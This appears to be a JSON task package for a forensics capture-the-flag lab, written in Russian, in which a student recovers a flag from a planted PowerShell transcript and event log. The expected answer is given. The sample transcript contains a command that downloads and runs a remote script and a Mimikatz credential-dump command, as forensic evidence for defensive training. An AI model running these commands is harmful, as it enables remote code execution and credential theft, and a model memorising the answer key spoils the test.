@@ -1,0 +1,28 @@
+{
+  "id": "win-powershell-transcript",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{p0w3rsh3ll_tr4nscr1pt_l34k}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Задача: восстановление PowerShell-кода\n\nДана стенограмма сессии и журнал Operational. История команд подчищена, но транскрипт остался. Найди флаг.\n\n1. `cat PowerShell_transcript.txt`.\n2. `strings PowerShell-Operational.evtx` — события 4104.\n3. `grep nto PowerShell_transcript.txt > found.txt`.\n"
+    },
+    {
+      "path": "/home/student/task/PowerShell_transcript.txt",
+      "text": "**********************\nWindows PowerShell transcript start\nStart time: 20260314021133\nUsername: CORP\\jdoe\n**********************\nPS> IEX (New-Object Net.WebClient).DownloadString('http://10.10.20.9/a.ps1')\nPS> Invoke-Mimikatz -DumpCreds\nPS> $flag = 'nto{p0w3rsh3ll_tr4nscr1pt_l34k}'\n"
+    },
+    {
+      "path": "/home/student/task/PowerShell-Operational.evtx",
+      "b64": "RWxmRmlsZQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABNaWNyb3NvZnQtV2luZG93cy1Qb3dlclNoZWxsL09wZXJhdGlvbmFsDQo8RXZlbnRJRD40MTA0PC9FdmVudElEPg0KPFNjcmlwdEJsb2NrVGV4dD5JbnZva2UtTWltaWthdHogLUR1bXBDcmVkczwvU2NyaXB0QmxvY2tUZXh0Pg0K",
+      "mode": "644"
+    }
+  ]
+}
